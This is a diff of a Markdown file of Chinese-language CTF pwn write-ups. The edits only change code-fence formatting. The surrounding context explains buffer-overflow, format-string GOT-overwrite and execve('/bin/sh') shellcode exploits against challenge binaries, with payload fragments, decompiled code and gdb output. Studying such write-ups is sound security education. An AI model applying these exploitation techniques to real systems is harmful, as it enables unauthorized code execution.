@@ -193,12 +193,11 @@ TheNameCalculator: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dyn
 ➜  TheNameCalculator ./TheNameCalculator
 What is your name?
 Ep3ius
-I've heard better
+I‘ve heard better
 ```
 
-开ida发现在main里有个套路check，v4在read_buf后不再修改，并且buf的输入大小可以正好覆盖v4的值，所以我们构造payload = 'a'* (0x2c-0x10)+p32(0x6A4B825)让v4在if判断时的值为0x6A4B825
-
-```c
+开ida发现在main里有个套路check，v4在read_buf后不再修改，并且buf的输入大小可以正好覆盖v4的值，所以我们构造`payload = 'a'* (0x2c-0x10)+p32(0x6A4B825)`让v4在if判断时的值为0x6A4B825
+```
 puts("What is your name?");
 fflush(stdout);
 read(0, &buf, 0x20u);
@@ -211,14 +210,14 @@ if ( v4 == 0x6A4B825 )
 
 进入secretFunc函数后发现函数最末尾有个格式化字符串漏洞，并且可以通过改exit_got来实现跳转，但中间有一段对输入进行一个异或加密，加密方式很简单就不再赘述，最终要达到的就是输入'aaaa%12$x'能返回未加密时格式化字符串正确的参数就算成功了，剩下的就是普通的格式化字符串改got的标准套路了，不过输入的fmt_payload的大小限制在了27而如果我们直接用fmtstr_payload生成的payload的长度是超过这个大小的，恰巧的是exit_got和superSecretFunc的前两位相同都为0x0804，所以我们的payload就不需要再改exit_got的前两位使我们payload的长度缩减至21
 
-```c
+```
 for ( i = buf; i < (int *)((char *)&buf[-1] + v3); i = (int *)((char *)i + 1) )
     *i ^= 0x5F7B4153u;
 ```
 
 encrypt
 
-```python
+```
 def encrypt(enc):
     buf = list(enc)
     for i in range(0, len(buf) - 4):
@@ -232,7 +231,7 @@ def encrypt(enc):
 
 EXP
 
-```python
+``` python
 from pwn import*
 context(os='linux',arch='i386')#,log_level='debug')
 n = process('./TheNameCalculator')
@@ -285,7 +284,7 @@ noxCTF{M1nd_7he_Input}
 
 简单的bof类型题目，先检查文件
 
-```bash
+```
 ➜  bigboy file boi
 boi: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=1537584f3b2381e1b575a67cba5fbb87878f9711, not stripped
 ➜  bigboy checksec boi
@@ -299,7 +298,7 @@ boi: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, in
 
 idaF5看一下程序逻辑
 
-```c
+```
 int __cdecl main(int argc, const char **argv, const char **envp)
 {
   __int64 buf; // [rsp+10h] [rbp-30h]
@@ -324,8 +323,8 @@ int __cdecl main(int argc, const char **argv, const char **envp)
 }
 ```
 本以为构造payload = 'a'* (0x30-0x20)+p32(0xCAF3BAEE)就可以直接过if判断getshell，然而事情并没那么简单，gdb调试一下发现0xCAF3BAEE距离我们想要出现在的位置差了4
+```
 
-```bash
 [-------------------------------------code-------------------------------------]
    0x40069b <main+90>:  mov    edi,0x0
    0x4006a0 <main+95>:  call   0x400500 <read@plt>
@@ -353,7 +352,7 @@ $1 = 0xdeadbe0a
 
 idaF5看不出什么东西，直接切汇编
 
-```c
+```
 mov     dword ptr [rbp+v6+4], 0DEADBEEFh
 mov     edi, offset s   ; "Are you a big boiiiii??"
 call    _puts
@@ -396,7 +395,7 @@ flag{Y0u_Arrre_th3_Bi66Est_of_boiiiiis}
 
 #### PWN—get it
 
-```bash
+```
 ➜  get_it file get_it
 get_it: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=87529a0af36e617a1cc6b9f53001fdb88a9262a2, not stripped
 ➜  get_it checksec get_it
@@ -438,7 +437,7 @@ flag{y0u_deF_get_itls}
 
 #### PWN—shell->code
 
-```bash
+```
 ➜  shellpointcode file shellpointcode
 shellpointcode: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=214cfc4f959e86fe8500f593e60ff2a33b3057ee, not stripped
 ➜  shellpointcode checksec shellpointcode
@@ -453,7 +452,7 @@ shellpointcode: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamica
 
 很明显的让你写shellcode的题目，简单的审计和运行过一遍程序后发现他是一个有两个节点链表结构，并且每个节点输入最多为15byte，并且在node.next泄露出了栈上的地址，对于完整shellcode来说15字节一般是不够的
 
-```bash
+```
 ➜  shellpointcode ./shellpointcode
 Linked lists are great!
 They let you chain pieces of data together.
@@ -473,7 +472,7 @@ Thanks 111
 
 简单分析调试后可以得到栈溢出后8byte后即为返回地址，我们在写完ret地址后接着写入‘/bin/sh’可以达到在开始执行shellcode时rsp里存放的是指向/bin/sh的指针，那么便可以利用mov rdi,rsp使‘/bin/sh\0’作为execve的参数来调用execve('/bin/sh')来getshell
 
-```bash
+```
 [----------------------------------registers-----------------------------------]
 RAX: 0x19
 RBX: 0x0
@@ -516,7 +515,8 @@ Legend: code, data, rodata, value
 0x000055d7207d08ee in ?? ()
 ```
 
-execve的汇编可以参考http://spd.dropsec.xyz/2017/02/20/%E4%BB%8E%E6%B1%87%E7%BC%96%E8%A7%92%E5%BA%A6%E5%88%86%E6%9E%90execve%E5%87%BD%E6%95%B0/
+execve的汇编可以参考
+http://spd.dropsec.xyz/2017/02/20/%E4%BB%8E%E6%B1%87%E7%BC%96%E8%A7%92%E5%BA%A6%E5%88%86%E6%9E%90execve%E5%87%BD%E6%95%B0/
 
 EXP
 
